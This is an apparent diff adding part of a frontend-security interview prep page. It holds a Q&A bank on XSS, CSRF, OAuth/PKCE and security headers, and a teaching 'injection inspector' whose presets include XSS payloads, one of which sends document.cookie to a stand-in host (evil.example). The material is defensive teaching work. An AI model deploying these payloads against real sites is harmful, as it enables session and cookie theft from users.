+          <p style="margin:0">A <code class="k">message</code> handler is a public API of your window: any page that can obtain a handle to it (opened it, framed it, or was opened by it) can post to it. Without <code class="k">if (e.origin !== 'https://trusted.example') return;</code> an attacker injects their own token — session fixation by another name — or drives whatever else the handler does. Check <code class="k">e.origin</code> against an allowlist, optionally verify <code class="k">e.source</code>, and validate the payload's shape. The mirror-image bug is sending with <code class="k">postMessage(data, '*')</code>, which delivers your data to whatever origin now occupies that frame.</p></div>
+      </div>
+    </section>
+    <section id="bank">
+      <div class="kicker">10 — Rapid fire</div>
+      <h2>Interview Q&amp;A bank</h2>
+      <p>Cover the answer, say yours out loud, then reveal. Filter by topic to drill a weak area.</p>
+      <div class="qtools" role="group" aria-label="Controls">
+        <span class="count" id="count"></span>
+        <button class="qbtn" id="toggleAll" aria-pressed="false">Reveal all</button>
+      </div>
+      <div class="qtools" id="chips" role="group" aria-label="Filter by topic">
+        <button class="fchip on" data-f="all">All</button>
+        <button class="fchip" data-f="events">Events</button>
+        <button class="fchip" data-f="xss">XSS</button>
+        <button class="fchip" data-f="csrf">CSRF/tokens</button>
+        <button class="fchip" data-f="storage">Storage</button>
+        <button class="fchip" data-f="oauth">OAuth/PKCE</button>
+        <button class="fchip" data-f="attacks">Attacks</button>
+        <button class="fchip" data-f="headers">Headers</button>
+      </div>
+      <div id="qbank"></div>
+    </section>
+  </main>
+</div>
+<footer>Built for interview prep · escape output, guard tokens, distrust the boundary.</footer>
+
+<script>
+const QA = [["events", "Events", "What are the three event phases?", "Capture (root down to target), target, then bubble (target back up to root). Listeners run on the bubble phase by default; pass { capture: true } to handle during capture."], ["events", "Events", "stopPropagation vs preventDefault?", "stopPropagation halts the event travelling further (other elements' handlers won't fire). preventDefault cancels the browser's default action (submit, navigation) but propagation continues. They're independent."], ["events", "Events", "event.target vs event.currentTarget?", "target is the element the event originated on (deepest clicked node). currentTarget is the element whose listener is currently executing. Delegation relies on the difference."], ["events", "Events", "What is event delegation and why does it scale?", "Attaching one listener on a stable ancestor and using e.target/closest() to handle events from many children. It uses far fewer listeners, works for dynamically added elements, and saves memory."], ["events", "Events", "Do all events bubble?", "Most do, but some don't — focus, blur, mouseenter, mouseleave. For non-bubbling events you either listen directly or use the capture phase / focusin/focusout equivalents."], ["events", "Events", "How does React handle events?", "It uses a synthetic event system and attaches delegated listeners at the root container (React 17+ at the app root, not document), then dispatches to your handlers — its own event delegation."], ["xss", "XSS", "What is XSS?", "Cross-Site Scripting: an attacker gets their JavaScript to run in your origin, where it can read the DOM, non-HttpOnly cookies, and localStorage, and act as the user. Types: stored, reflected, DOM-based."], ["xss", "XSS", "How does React mitigate XSS, and where does it reopen?", "JSX auto-escapes interpolated values, rendering them as text. It reopens with dangerouslySetInnerHTML (raw HTML), javascript: URLs, and eval/innerHTML. Sanitize (DOMPurify) any HTML you must inject, and add a CSP."], ["xss", "XSS", "What is a Content-Security-Policy?", "An HTTP header that restricts which sources scripts/styles/resources can load from and can block inline scripts — defense in depth that limits damage even if an injection slips through."], ["csrf", "CSRF/tokens", "What is CSRF?", "Cross-Site Request Forgery: a malicious site causes the victim's browser to send an authenticated request to your site using cookies that are sent automatically. The attacker triggers the action but can't read the response."], ["csrf", "CSRF/tokens", "How do you defend against CSRF?", "SameSite cookies — Strict blocks all cross-site sends; Lax (the default) blocks cross-site subrequests and form POSTs but still sends on top-level GET navigations — the main modern defense; anti-CSRF tokens the server validates (unreadable cross-origin); and verifying Origin/Referer on state-changing requests."], ["csrf", "CSRF/tokens", "HttpOnly cookie vs localStorage for a token?", "HttpOnly cookie: JS can't read it (XSS can't steal it) but it's auto-sent so needs CSRF defense. localStorage: no CSRF but readable by any script, so one XSS exfiltrates it. It's a trade-off; XSS is the deeper risk."], ["csrf", "CSRF/tokens", "What's the recommended token approach?", "A short-lived access token in an HttpOnly, Secure, SameSite cookie plus a refresh token, with CSRF protection. Keep the token unreadable by JS, and prioritize preventing XSS since it undermines most schemes."], ["storage", "Storage", "cookie vs localStorage vs sessionStorage?", "Cookies (~4KB) are sent automatically with requests and can be HttpOnly (JS-invisible). localStorage (~5-10MB) persists until cleared and is JS-readable. sessionStorage is like localStorage but scoped to a tab and cleared on close."], ["storage", "Storage", "Which storage is sent to the server automatically?", "Cookies — on every matching request (which is why they enable CSRF and need SameSite). localStorage and sessionStorage are never sent automatically; you attach their values to requests yourself."], ["storage", "Storage", "When would you use sessionStorage?", "For per-tab, ephemeral state that shouldn't persist or leak across tabs — e.g. a multi-step form's progress or a one-time redirect target — since it's cleared when the tab closes and isn't shared between tabs."], ["oauth", "OAuth/PKCE", "What problem does PKCE solve?", "Authorization code interception. The code comes back through a redirect the client does not control, so a malicious app on the same URL scheme, a rogue extension or a proxy can steal it. A public client has no secret to prove ownership at the token endpoint, so PKCE supplies a per-request one instead."], ["oauth", "OAuth/PKCE", "Walk through the PKCE handshake.", "Generate a random 43-128 char code_verifier; send code_challenge = BASE64URL(SHA-256(verifier)) with code_challenge_method=S256 on the /authorize redirect; the server binds that challenge to the code it issues; you POST the code plus the raw verifier to /token; the server re-hashes and compares. No match, no tokens."], ["oauth", "OAuth/PKCE", "Why is code_challenge_method=plain unsafe?", "With plain the challenge is the verifier, so it travels through the same redirect the attacker is already reading. It defeats the exact threat PKCE assumes. It only exists for clients that cannot compute SHA-256; browsers always can, so use S256 and refuse to downgrade."], ["oauth", "OAuth/PKCE", "Does PKCE replace the state parameter?", "No. PKCE stops someone else redeeming your code and is checked by the authorization server. state stops callback CSRF -- an attacker feeding you their code -- and is checked by your client. PKCE breaks the code-injection variant as a side effect, but keep state: it is one line and it carries your post-login return URL."], ["oauth", "OAuth/PKCE", "What is the OIDC nonce for?", "ID token replay. You send a nonce on /authorize, the provider embeds it in the ID token, and you verify it matches on receipt -- so an older or borrowed ID token cannot be injected into your session. Different job from both state and PKCE."], ["oauth", "OAuth/PKCE", "Why was the implicit flow deprecated?", "It returned the access token in the URL fragment, so the token leaked into history, Referer headers, analytics that log location.href and any server that saw it. It could not authenticate the client and gave no usable refresh token, pushing apps toward long-lived access tokens. Authorization code + PKCE replaces it."], ["oauth", "OAuth/PKCE", "Where do you store the code_verifier?", "sessionStorage, deleted immediately after the token exchange. Per-tab scoping means two parallel logins do not clobber each other, and it dies with the tab. A verifier left lying around is a live credential for any code not yet redeemed."], ["oauth", "OAuth/PKCE", "Why does a confidential client need PKCE too?", "OAuth 2.1 makes it mandatory for all clients. A client secret proves who you are but not that this particular code belongs to this particular request, so a leaked secret plus a stolen code is enough. PKCE binds the code to the request that started it, independent of the secret."], ["oauth", "OAuth/PKCE", "How does a loose redirect_uri turn into a stolen token?", "Wildcard or prefix matching lets the attacker pick an allowed URI that is also an open redirect on your domain. The code lands there and is forwarded, query string and all, to them. Exact string matching on the registered URI is the fix, and it is why open redirects are a real finding, not a nuisance."], ["oauth", "OAuth/PKCE", "Does PKCE protect the token after login?", "No -- it only secures the exchange. If the access token ends up in localStorage, one XSS exfiltrates it, and the attacker can also run the entire PKCE flow silently in your origin against the still-valid session at the authorization server. That is the case for a BFF that holds the tokens server-side and gives the browser only an HttpOnly session cookie."], ["oauth", "OAuth/PKCE", "How should refresh tokens work in a browser?", "Rotating, with reuse detection: every refresh returns a new token and replaying an old one revokes the whole chain. A non-rotating refresh token in JS-reachable storage is a long-lived bearer credential, which is worse than the short-lived access token it renews."], ["xss", "XSS", "What is DOM-based XSS and why is it the frontend's problem?", "The payload never touches the server: client code reads an attacker-controlled source (the URL, a message, an API field) and writes it to a sink like innerHTML or eval. The server response is byte-identical for every user, so server-side scanners see nothing — the whole bug lives in your bundle."], ["xss", "XSS", "Name the dangerous DOM sinks.", "innerHTML, outerHTML and insertAdjacentHTML (HTML parsing), document.write, eval and new Function, the string form of setTimeout, anything assigning to location/href/src (javascript: URLs), and iframe srcdoc. Framework equivalents: dangerouslySetInnerHTML, v-html, bypassSecurityTrustHtml."], ["xss", "XSS", "Why is escaping context-sensitive?", "The correct encoding depends on where the value lands. HTML text needs entity encoding; an attribute needs quoting plus quote encoding; a URL needs scheme allowlisting then URL encoding; inside a script block you should pass data as JSON rather than interpolating at all. One generic escape function applied to the wrong context is still a hole."], ["xss", "XSS", "Does React protect an href?", "No. JSX auto-escapes text interpolation, but href={userUrl} is passed through, so a javascript: URL executes in your origin on click. Validate the scheme yourself with new URL() and reject anything that is not http or https."], ["xss", "XSS", "Why does a <script> tag inserted via innerHTML not run?", "The HTML spec marks scripts inserted that way as already 'started' so they are not executed. That is exactly why real payloads use event-handler attributes like img onerror or svg onload instead — and why 'I stripped script tags' is not a defense."], ["xss", "XSS", "What is mutation XSS?", "Markup that is inert when the sanitizer inspects it but becomes live after the browser re-parses and normalises the DOM — an innerHTML round-trip can resurrect a payload. It is the argument for sanitizing with a real parser rather than regexes, and for keeping the sanitizer up to date."], ["xss", "XSS", "What do Trusted Types actually change?", "With require-trusted-types-for 'script', assigning a plain string to innerHTML and other sinks throws. Every write must go through a policy function you wrote, so DOM XSS becomes a runtime guarantee enforced by the browser rather than something code review has to catch. Chromium-only today."], ["csrf", "CSRF/tokens", "Why is a JSON API partly self-defending against CSRF?", "A cross-origin fetch with application/json or a custom header is not a simple request, so the browser preflights it and your server refuses. An HTML form cannot produce those headers. It is not sufficient alone — reject bodies that arrive as text/plain but parse as JSON, and keep the token or Origin check."], ["csrf", "CSRF/tokens", "What breaks the double-submit cookie pattern?", "An unsigned token fails when any subdomain — or a subdomain takeover — can write cookies on the parent domain, because the attacker then controls both halves of the comparison. HMAC the token to the session, and use the __Host- prefix so the cookie is host-only."], ["csrf", "CSRF/tokens", "Is CORS a CSRF defense?", "No. A restrictive Access-Control-Allow-Origin stops the attacker reading the response; the request is still sent and still executes. CSRF is about the side effect, not the response body."], ["csrf", "CSRF/tokens", "What is login CSRF?", "The attacker forges a login as their own account, so the victim then acts inside the attacker's session — saving a card, placing orders — and the attacker reads the history later. Protect the login form with a token too, and regenerate the session id on authentication."], ["attacks", "Attacks", "What is clickjacking and how do you stop it?", "Your page is loaded in a transparent iframe under bait, so a real click from the authenticated user lands on a real button. CSRF tokens do not help, because the click happens in your origin. Stop it with CSP frame-ancestors (X-Frame-Options as the legacy fallback); JavaScript frame-busting is defeated by the sandbox attribute."], ["attacks", "Attacks", "What is reverse tabnabbing?", "A target=_blank link hands the opened page window.opener, which it uses to replace your still-open tab with a fake login. Fix with rel='noopener noreferrer'. Browsers now imply noopener, but be explicit for user-generated links, markdown output and webviews."], ["attacks", "Attacks", "Why is an open redirect dangerous if it only redirects?", "The link genuinely is your domain, so it passes eyeball checks and mail filters and borrows your reputation for a phishing page. It is also the standard escalation for stealing OAuth authorization codes. Resolve the destination against your origin, or keep it server-side against the session."], ["attacks", "Attacks", "What is prototype pollution?", "A recursive merge or parser copies a __proto__ or constructor.prototype key onto Object.prototype, so every object inherits the attacker's property. Combined with a gadget — a library reading an option it assumed was undefined — it becomes DOM XSS or an auth bypass. Reject those keys, use Object.create(null) or Map, and consider freezing Object.prototype."], ["attacks", "Attacks", "What is DOM clobbering?", "Named elements become properties of window and document, so injected script-free markup like <a id=config> can overwrite a global your code reads. It bypasses sanitizers that only strip scripts and handlers. Declare globals properly, type-check before use, and strip id and name in the sanitizer."], ["attacks", "Attacks", "What are the two postMessage mistakes?", "Sending with '*' as the target origin, which delivers your data to whatever origin now occupies the frame; and receiving without checking event.origin, which lets any page that can get a handle on your window drive a handler that often does privileged things. Validate the payload shape too."], ["attacks", "Attacks", "How does a CORS misconfiguration become a vulnerability?", "Reflecting the request's Origin into Access-Control-Allow-Origin together with Allow-Credentials true lets any site read authenticated responses. Suffix matching (evil-yourdomain.com) and allowing the null origin are the other two. Use an exact allowlist plus Vary: Origin."], ["attacks", "Attacks", "How do you reduce third-party script risk?", "Every script src runs with your origin's full authority. Use Subresource Integrity with crossorigin, pin versions with a committed lockfile and npm ci, disable install scripts in CI, review dependency changes, and constrain sources with CSP. For payment fields, isolate them in a provider-hosted iframe so your origin never sees the card number."], ["attacks", "Attacks", "What is a subdomain takeover and why does it matter to the frontend?", "A DNS record still points at a decommissioned host, so an attacker claims the subdomain. They then sit inside your site for SameSite purposes, can write cookies scoped to the parent domain (cookie tossing), and can break unsigned double-submit CSRF tokens. Audit DNS and delete dangling records."], ["attacks", "Attacks", "Why is client-side validation not a security control?", "Because the attacker does not use your form — they call the endpoint directly. Client-side checks are a usability feature that makes the happy path pleasant; the rule is only actually enforced on the server."], ["headers", "Headers", "What makes a CSP strong rather than decorative?", "A per-response nonce with 'strict-dynamic' instead of a host allowlist — roughly 94% of deployed allowlist policies were found bypassable via JSONP or open redirects on allowed CDNs. Add object-src 'none', base-uri 'none', frame-ancestors, and no unsafe-inline or unsafe-eval. Roll it out report-only first."], ["headers", "Headers", "What does base-uri 'none' protect against?", "An injected <base> tag, which would silently repoint every relative script and resource URL on the page at the attacker's host — a way to win even under a script-src allowlist."], ["headers", "Headers", "Name the headers you would set on an authenticated app.", "Content-Security-Policy (nonce-based, with frame-ancestors), Strict-Transport-Security with includeSubDomains, X-Content-Type-Options: nosniff, a strict Referrer-Policy, Permissions-Policy to drop unused capabilities, COOP and CORP for cross-origin isolation, and Cache-Control: no-store on authenticated responses."], ["headers", "Headers", "What do COOP, COEP and CORP do?", "They isolate your page from cross-origin windows and resources — COOP severs window.opener relationships, CORP declares who may embed your resources, and COEP requires every subresource to opt in. Together they mitigate XS-Leaks and Spectre-style cross-origin inference, and they are the prerequisite for crossOriginIsolated features like SharedArrayBuffer."], ["headers", "Headers", "Why nosniff?", "Without it a browser may sniff a response's bytes and treat an uploaded 'image' as HTML or JavaScript, executing it in your origin. Serve user-uploaded files from a separate origin as well, so even a successful sniff lands somewhere harmless."]];
+const bank = document.getElementById('qbank');
+const esc = s => s.replace(/&/g,'&amp;').replace(/</g,'&lt;');
+// light inline-code styling for tokens that look like code
+const codeify = s => esc(s).replace(/\b([A-Za-z.]+\([^)]*\)|Promise\.[a-zA-Z]+|\.then|\.catch|\.finally|async|await|for…of|setTimeout|AbortController|AggregateError|unhandledrejection|allSettled|forEach)\b/g,
+  m => `<code class="k">${m}</code>`);
+
+QA.forEach((q,i)=>{
+  const [topic,label,ques,ans] = q;
+  const card = document.createElement('div');
+  card.className = 'qcard';
+  card.dataset.topic = topic;
+  card.innerHTML =
+    `<button class="qhead" aria-expanded="false">
+       <span class="qmark">▸</span>
+       <span class="qtopic">${label}</span>
+       <span class="qtext">${i+1}. ${esc(ques)}</span>
+     </button>
+     <div class="qbody"><div class="inner"><div class="ans"><p style="margin:0">${codeify(ans)}</p></div></div></div>`;
+  bank.appendChild(card);
+});
+
+const cards = [...document.querySelectorAll('.qcard')];
+cards.forEach(c=>{
+  const head = c.querySelector('.qhead');
+  head.addEventListener('click',()=>{
+    const open = c.classList.toggle('open');
+    head.setAttribute('aria-expanded', open);
+    syncToggleLabel();
+  });
+});
+
+const toggleAll = document.getElementById('toggleAll');
+function visibleCards(){ return cards.filter(c=>!c.classList.contains('hide')); }
+function syncToggleLabel(){
+  const vis = visibleCards();
+  const allOpen = vis.length && vis.every(c=>c.classList.contains('open'));
+  toggleAll.textContent = allOpen ? 'Hide all' : 'Reveal all';
+  toggleAll.setAttribute('aria-pressed', allOpen);
+}
+toggleAll.addEventListener('click',()=>{
+  const vis = visibleCards();
+  const allOpen = vis.length && vis.every(c=>c.classList.contains('open'));
+  vis.forEach(c=>{
+    c.classList.toggle('open', !allOpen);
+    c.querySelector('.qhead').setAttribute('aria-expanded', !allOpen);
+  });
+  syncToggleLabel();
+});
+
+const chips = [...document.querySelectorAll('.fchip')];
+const countEl = document.getElementById('count');
+function applyFilter(f){
+  cards.forEach(c=> c.classList.toggle('hide', f!=='all' && c.dataset.topic!==f));
+  const n = visibleCards().length;
+  countEl.textContent = `${n} question${n!==1?'s':''}`;
+  syncToggleLabel();
+}
+chips.forEach(chip=>{
+  chip.addEventListener('click',()=>{
+    chips.forEach(x=>x.classList.remove('on'));
+    chip.classList.add('on');
+    applyFilter(chip.dataset.f);
+  });
+});
+applyFilter('all');
+
+/* ---------------- quiz reveals ---------------- */
+document.querySelectorAll('[data-quiz]').forEach(card=>{
+  const btn = card.querySelector('.reveal-btn');
+  const ans = card.querySelector('.answer');
+  const orig = btn.textContent;
+  btn.addEventListener('click',()=>{
+    const open = ans.classList.toggle('show');
+    btn.textContent = open ? 'Hide answer' : orig;
+  });
+});
+
+/* ---------------- nav scroll-spy ---------------- */
+const links = [...document.querySelectorAll('nav.side a')];
+const secs = links.map(a=>document.querySelector(a.getAttribute('href')));
+const obs = new IntersectionObserver(entries=>{
+  entries.forEach(e=>{
+    if(e.isIntersecting){
+      const id='#'+e.target.id;
+      links.forEach(a=>a.classList.toggle('active', a.getAttribute('href')===id));
+    }
+  });
+},{rootMargin:'-30% 0px -60% 0px'});
+secs.forEach(s=>s&&obs.observe(s));
+
+/* mobile menu */
+const side=document.getElementById('side'), backdrop=document.getElementById('backdrop');
+document.getElementById('menuBtn').addEventListener('click',()=>{side.classList.toggle('open');backdrop.classList.toggle('open');});
+backdrop.addEventListener('click',()=>{side.classList.remove('open');backdrop.classList.remove('open');});
+links.forEach(a=>a.addEventListener('click',()=>{side.classList.remove('open');backdrop.classList.remove('open');}));
+
+
+/* ---------------- injection inspector ---------------- */
+(function(){
+  const inp=document.getElementById('xssIn');
+  if(!inp) return;
+  const outText=document.getElementById('xssText'),
+        outTree=document.getElementById('xssTree'),
+        outEsc =document.getElementById('xssEsc'),
+        outVec =document.getElementById('xssVectors'),
+        verdict=document.getElementById('xssVerdict');
+
+  const PRESETS={
+    plain:'Great fill on that order, thanks!',
+    img:'<img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">',
+    svg:'<svg onload=alert(document.domain)>',
+    script:'<script>alert(1)<\/script>',
+    attr:'" autofocus onfocus=alert(1) x="',
+    url:'javascript:fetch(\'/api/orders\',{method:\'POST\',body:\'…\'})'
+  };
+
+  const escHtml = t => t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+                        .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+  const CTX={
+    body:{ wrap:v=>v,                            show:v=>['<p>',v,'</p>'] },
+    attr:{ wrap:v=>'<input value="'+v+'">',      show:v=>['<input value="',v,'">'] },
+    href:{ wrap:v=>'<a href="'+v+'">link</a>',   show:v=>['<a href="',v,'">link</a>'] }
+  };
+  let ctx='body';
+  const clip = t => t.length>60 ? t.slice(0,60)+'…' : t;
+
+  function analyse(raw){
+    const src=CTX[ctx].wrap(raw);
+    const doc=new DOMParser().parseFromString('<body>'+src+'</body>','text/html');
+    const lines=[], hot=[], warn=[];
+    (function walk(node,depth){
+      Array.prototype.forEach.call(node.childNodes,function(n){
+        const pad='  '.repeat(depth);
+        if(n.nodeType===3){
+          const t=n.nodeValue.trim();
+          if(t) lines.push(pad+'#text  "'+clip(t)+'"');
+        }else if(n.nodeType===1){
+          const tag=n.tagName.toLowerCase();
+          const attrs=Array.prototype.map.call(n.attributes,a=>a.name+'="'+clip(a.value)+'"').join(' ');
+          lines.push(pad+'<'+tag+(attrs?' '+attrs:'')+'>');
+          Array.prototype.forEach.call(n.attributes,function(a){
+            if(/^on/i.test(a.name))
+              hot.push('· event handler   '+a.name+'="'+clip(a.value)+'"\n    fires on the matching event — no <script> tag needed');
+            if(/^(href|src|action|formaction|xlink:href)$/i.test(a.name) && /^\s*(javascript|vbscript|data:text\/html)/i.test(a.value))
+              hot.push('· dangerous URL   '+a.name+'="'+clip(a.value)+'"\n    executes in your origin when followed');
+            if(/^srcdoc$/i.test(a.name))
+              hot.push('· iframe srcdoc   a whole document, parsed and run');
+          });
+          if(tag==='script')
+            warn.push('· <script> element parsed\n    inert when assigned via innerHTML, but live via document.write\n    or if the payload is reflected by the server into the page');
+          if(['iframe','object','embed','form'].indexOf(tag)>-1)
+            warn.push('· <'+tag+'> element\n    embeds or submits to an attacker-controlled target');
+          walk(n,depth+1);
+        }
+      });
+    })(doc.body,0);
+    return {tree: lines.join('\n') || '(nothing — parsed as empty)', hot:hot, warn:warn};
+  }
+
+  function render(){
+    const src=inp.value;
+    outText.textContent = src || '(empty)';
+    const seg=CTX[ctx].show(src||'…');
+    const t=document.getElementById('xssTmpl');
+    t.textContent='';
+    t.appendChild(document.createTextNode(seg[0]));
+    const em=document.createElement('b'); em.textContent=seg[1]; t.appendChild(em);
+    t.appendChild(document.createTextNode(seg[2]));
+    const r=analyse(src);
+    outTree.textContent = r.tree;
+    outEsc.textContent  = escHtml(src) || '(empty)';
+    const all=r.hot.concat(r.warn);
+    outVec.textContent = all.length ? all.join('\n') : 'none — this input produces no executable vector';
+    outVec.className = 'out '+(r.hot.length?'bad':(r.warn.length?'':'good'));
+    if(r.hot.length){
+      verdict.className='verdict risk';
+      verdict.textContent='would execute — '+r.hot.length+' vector'+(r.hot.length>1?'s':'')+' found';
+    }else if(r.warn.length){
+      verdict.className='verdict mid';
+      verdict.textContent='context-dependent — safe via innerHTML, not via every sink';
+    }else{
+      verdict.className='verdict safe';
+      verdict.textContent='inert — renders as text';
+    }
+  }
+
+  inp.addEventListener('input',render);
+  const CTX_FOR={attr:'attr',url:'href'};
+  function setCtx(c){
+    ctx=c;
+    document.querySelectorAll('#xssLab [data-ctx]').forEach(function(x){ x.classList.toggle('on', x.dataset.ctx===c); });
+  }
+  document.querySelectorAll('#xssLab [data-xp]').forEach(function(b){
+    b.addEventListener('click',function(){
+      inp.value=PRESETS[b.dataset.xp];
+      setCtx(CTX_FOR[b.dataset.xp] || 'body');
+      render();
+    });
+  });
+  document.querySelectorAll('#xssLab [data-ctx]').forEach(function(b){
+    b.addEventListener('click',function(){ setCtx(b.dataset.ctx); render(); });
+  });
+  inp.value=PRESETS.img;
+  render();
+})();
+
+</script>
+<script id="fe-prep-keys">/* forward the deck's shortcuts up: keys inside an iframe never reach the parent */
+window.addEventListener('keydown',function(e){
+  if((e.metaKey||e.ctrlKey)&&e.key.toLowerCase()==='k'){e.preventDefault();parent.postMessage({fePrep:'palette'},'*');}
+  else if(e.key==='Escape'){parent.postMessage({fePrep:'close'},'*');}
+});</script>
+</body>
+</html>
